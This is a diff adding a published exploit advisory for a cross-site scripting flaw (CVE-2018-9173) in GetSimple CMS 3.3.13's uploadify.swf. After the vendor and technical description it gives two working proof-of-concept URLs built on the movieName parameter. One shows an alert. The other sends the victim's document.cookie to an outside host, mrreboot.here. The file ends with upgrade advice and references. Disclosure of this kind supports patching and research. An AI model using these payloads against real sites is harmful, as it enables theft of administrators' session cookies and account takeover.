@@ -1,0 +1,54 @@
+#######################################
+# Exploit Title: GetSimple CMS 3.3.13 - Cross Site Scripting Vulnerability
+# Google Dork: N/A
+# Date: 03-04-2018
+#######################################
+# Exploit Author: Sureshbabu Narvaneni#
+#######################################
+# Author Blog : http://nullnews.in
+# Vendor Homepage: http://get-simple.info/
+# Software Link: http://get-simple.info/download/
+# Affected Version: 3.3.13
+# Category: WebApps
+# Tested on: Win7 Enterprise x86/Kali Linux 4.12 i686
+# CVE : CVE-2018-9173
+#
+# 1. Vendor Description:
+#
+# GetSimple is an XML based, stand-alone, fully independent and lite
+Content Management System. To go along with its
+# best-in-class user interface, we have loaded it with features that every
+website needs, but with nothing it
+# doesn't. GetSimple is truly the simplest way to manage a small-business
+website.
+#
+# 2. Technical Description:
+#
+# Cross-site scripting (XSS) vulnerability in
+admin/template/js/uploadify/uploadify.swf in GetSimple CMS 3.3.13
+# allows remote attackers to inject arbitrary web script or HTML, as
+demonstrated by the movieName parameter.
+#
+# 3. Proof Of Concept:
+#
+#  Simple alert.
+#
+#  http://
+[URL]GetSimpleCMS-3.3.13/admin/template/js/uploadify/uploadify.swf?movieName="])}catch(
+#  e){alert("MrR3boot")}//
+#
+#  Grab the cookies
+#
+#  http://
+[URL]GetSimpleCMS-3.3.13/admin/template/js/uploadify/uploadify.swf?movieName="])}catch(
+#  e){window.location="https://mrreboot.here?"+document.cookie}//
+#
+# 4. Solution:
+#
+# Upgrade to latest release.
+# http://get-simple.info/download/
+#
+# 5. Reference:
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9173
+# https://github.com/GetSimpleCMS/GetSimpleCMS/issues/1266
+#####################################
